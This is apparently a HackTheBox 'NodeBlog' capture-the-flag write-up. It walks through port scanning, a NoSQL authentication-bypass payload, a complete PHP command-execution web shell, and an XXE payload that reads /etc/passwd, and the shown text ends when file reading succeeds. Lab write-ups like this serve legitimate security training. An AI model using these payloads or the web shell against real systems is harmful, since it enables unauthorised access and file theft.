# Box: NodeBlog
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A -v -p- -T4 10.129.96.160```

```
Nmap scan report for 10.129.96.160
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Blog
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/23%OT=22%CT=1%CU=32229%PV=Y%DS=2%DC=T%G=Y%TM=653635
OS:03%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 39.434 days (since Wed Sep 13 23:30:20 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   199.89 ms 10.10.14.1
2   200.02 ms 10.129.96.160

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 09:55:31 2023 -- 1 IP address (1 host up) scanned in 826.12 seconds
```
From our nmap scan we have 2 open ports, port 22 which runs the ssh service and port 5000 which runs the http service. We'll focus our enumeration today on port 5000



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6804e207-e945-4c9c-bb41-8d07196cca91)

From our nmap scan we can see that this webpage is running on the nodejs express framework

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/80a4db1f-b87b-43fe-b6c3-e530d43d96ea)

Lets try to login with default creds. we'll capture the request and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c5728ea7-d4ce-4b33-8039-76486543b90b)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/859495fa-100a-4460-a3ff-4e76a516bc50)

oops, invalid password.

During my research on the express framework I saw that asides the "Content-Type" ```application/x-www-form-urlencoded```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/59a10b9f-7a3f-4de3-85be-b48de20a8c6a)

So we can use the "Content-Type" ```application/json```. If we are using ```json``` this means our request will have a different structure

After editing, your request should look like this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f1e6e517-e7b5-443c-9436-0c05dcc75638)

nice nice, we were able to successfully change the content-type. One way we know this worked is from the "Invalid Password" error we got.


We can try to bypass this login page by using a ```NoSQL``` payload. So, we'll be performing Authentication Bypass in json format.

payload:```{"username": {"$gt":""}, "password": {"$gt":""}}```

Modifying our request should get us logged in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/27e8bd3d-739d-43da-8b5f-9580d7cd8d50)

We didn't get the "Invalid Password" error, does this mean we have successfully bypassed the login page?? Well lets confirm this by showing the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8c142595-5d21-4d22-8c12-6356f3af0690)

nice nice, we are in hehe.

We can see there's an upload button. Well, lets exploit this




# Exploitation

We'll start out by uploading a php script (no time to waste for testing with jpg or png extensions😂)

Lets create a php file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/nodeblog]
└─$ nano abeg.php 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/nodeblog]
└─$ cat abeg.php              
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
Lets upload this and see what happens, we'll capture this request and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a38d5d92-3ccb-4750-b76a-ab14515bd56a)

oops, we get the "invalid xml example" error. Well, this means the accepted file extension is xml.

We can see from the response we got on burpsuite the xml format we are to use

we'll create a simple xml file using that format

```xml
<?xml version="1.0" encoding="UTF-8"?>
<post>
<title>
  BlackAnon's Info
</title>
<description>
  BlackAnon is 26 years of age
</description>
<markdown>
  This is a markdown
</markdown>
</post> 
```
Well, that's my age right there hehe.

Save this in a file "info.xml"

After uploading, you should see this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/12ce2d59-7ded-4ebf-b996-84e3c06ed148)

As you can see our xml file got executed successfully.

Ever heard of XML external entity injection?

<font color="Green">XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
</font>

This means we can cook up a payload that can help us read files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<post>
<title>
  BlackAnon's Info
</title>
<description>
  &read;
</description>
<markdown>
  This is a markdown
</markdown>
</post> 
```
Save this in a file "abeg.xml"

Now lets upload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/30d0614a-0165-42cf-bfbc-2aa2cf6342c8)

Nice Nice, it worked






























